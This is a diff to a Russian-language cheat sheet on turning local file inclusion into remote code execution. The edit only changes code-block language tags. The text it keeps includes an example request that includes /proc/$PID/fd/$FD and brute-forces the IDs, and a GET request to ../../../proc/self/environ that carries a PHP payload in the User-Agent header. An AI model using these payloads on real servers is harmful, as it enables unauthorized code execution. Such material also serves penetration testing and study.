@@ -20,15 +20,14 @@
 
 1. Загрузи множество шеллов (например: 100)
 2. Включи ```/proc/$PID/fd/$FD```, где $PID - идентификатор процесса, а $FD - файловый дескриптор. Оба можно подобрать брутфорсом.
-
-```bash
+```python
 http://example.com/index.php?page=/proc/$PID/fd/$FD
 ```
 
 # LFI в RCE через /proc/self/environ
 
 Как и с лог-файлом, отправьте полезную нагрузку в заголовке User-Agent, она отразится в файле /proc/self/environ
-```url
+```python
 GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
 User-Agent: <?=phpinfo(); ?>
 ```
